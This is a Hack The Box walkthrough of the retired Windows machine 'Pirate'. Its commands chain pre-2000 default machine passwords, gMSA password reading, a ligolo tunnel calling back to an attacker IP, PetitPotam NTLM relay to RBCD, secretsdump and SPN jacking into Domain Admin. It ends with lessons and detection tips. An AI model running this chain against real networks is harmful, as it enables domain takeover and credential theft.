---
machine: Pirate
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, spn-jacking]
---

# Pirate — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Start from *assumed breach* credentials (`pentest`). BloodHound shows **Domain Computers** inside **Pre-Windows 2000 Compatible Access**, so machine accounts created the legacy way still carry the default password (lowercase name): `MS01$:ms01` and `EXCH01$:exch01`. `MS01$` holds **ReadGMSAPassword** on `gMSA_ADFS_prod$`; that hash gives WinRM on the DC, which is a **Hyper-V host** fronting an internal network where **WEB01** lives (ADFS, NTLMv1 and WebClient). **PetitPotam** coercion plus **LDAPS** relay → **RBCD** → Administrator on WEB01 → `secretsdump` → `a.white` → `a.white_adm` with constrained delegation and **WriteSPN** → **SPN jacking** onto the DC → Domain Admin.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389
```

```bash
nxc smb <IP> -u pentest -p '<password>' --shares
bloodhound-python -dc dc01.pirate.htb -d pirate.htb -u pentest -p '<password>' -ns <IP> -c All --zip
```

The DC is `DC01`, the domain `pirate.htb`, **SMB signing is on** but **LDAP signing is not enforced**: that is what makes the final relay possible.

## Pre-Windows 2000

```bash
nxc ldap dc01.pirate.htb -u '' -p '' --pre2k
```

```text
[+] MS01$:ms01
[+] EXCH01$:exch01
```

These are computer accounts created through the compatibility path that never logged on, so their default password was never rotated.

## gMSA

BloodHound flags `MS01$` with **ReadGMSAPassword** on `gMSA_ADFS_prod$`:

```bash
nxc ldap dc01.pirate.htb -u 'MS01$' -p 'ms01' --gmsa
```

```text
Account: gMSA_ADFS_prod$   NTLM: <hash>
Account: gMSA_ADCS_prod$   NTLM: <hash>
```

```bash
evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H '<hash>'
```

The gMSA has WinRM access to the DC and to WEB01.

## Pivot into the internal network

The DC doubles as a **Hyper-V** host with a second interface on `192.168.100.0/24`, where WEB01 sits.

```bash
# attacker
./proxy -selfcert
# on the DC
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
# in the proxy: session -> start, then route to 192.168.100.0/24
```

```bash
nmap -p- 192.168.100.2
```

WEB01 is an **ADFS** server with **NTLMv1 enabled** and the **WebClient** service running: both conditions for coercion and relay.

## RBCD through coercion and relay

```bash
python3 PetitPotam.py -u 'gMSA_ADFS_prod$' -p '<hash>' -hashes :<hash> \
  -d pirate.htb <LISTENER_IP> 192.168.100.2
```

```bash
ntlmrelayx.py -t ldaps://dc01.pirate.htb --delegate-access --remove-mic -smb2support
```

The relay writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on `WEB01$`. Request the ticket as Administrator:

```bash
impacket-getST -spn cifs/web01.pirate.htb -impersonate Administrator \
  -dc-ip dc01.pirate.htb 'pirate.htb/gMSA_ADFS_prod$:<hash>'
export KRB5CCNAME=Administrator@cifs_web01.pirate.htb.ccache
impacket-wmiexec -k -no-pass Administrator@web01.pirate.htb
```

## From WEB01 to Domain Admin

```bash
impacket-secretsdump -k -no-pass Administrator@web01.pirate.htb
```

The dump yields cleartext credentials (AutoLogon/DefaultPassword) for **`a.white`**, who holds **ForceChangePassword** over **`a.white_adm`**:

```bash
bloodyAD -u a.white -p '<password>' -d pirate.htb --host dc01.pirate.htb \
  set password a.white_adm '<NewPassword>!'
```

`a.white_adm` carries the two missing pieces: **constrained delegation** to `HTTP/WEB01` with protocol transition and **WriteSPN** on `WEB01$` and `DC01$`. That moves the delegated SPN onto the DC (**SPN jacking**) and requests a ticket for the controller itself:

```bash
impacket-getST -spn http/web01.pirate.htb -impersonate Administrator \
  -dc-ip dc01.pirate.htb 'pirate.htb/a.white_adm:<NewPassword>!'
# with the SPN rewritten to the DC, the ticket works for cifs/DC01
impacket-secretsdump -k -no-pass Administrator@dc01.pirate.htb
```

The domain Administrator hash gives both flags.

## Lessons

- Pre-Windows 2000 accounts with `logonCount=0` are free credentials; `nxc --pre2k` finds them in a minute.
- Reading a gMSA is reading a service identity with WinRM: always review the `ReadGMSAPassword` ACE.
- Coercion plus LDAPS relay stays alive while LDAP signing is not enforced.
- `secretsdump` on a middle server usually yields cleartext credentials and, with them, the next hop.
- `WriteSPN` on the DC combined with delegation is full domain control: the modern *SPN jacking*.
- Detection: mass 4625s for machine accounts, LDAP reads of `msDS-ManagedPassword`, and creation of `msDS-AllowedToActOnBehalfOfOtherIdentity`.
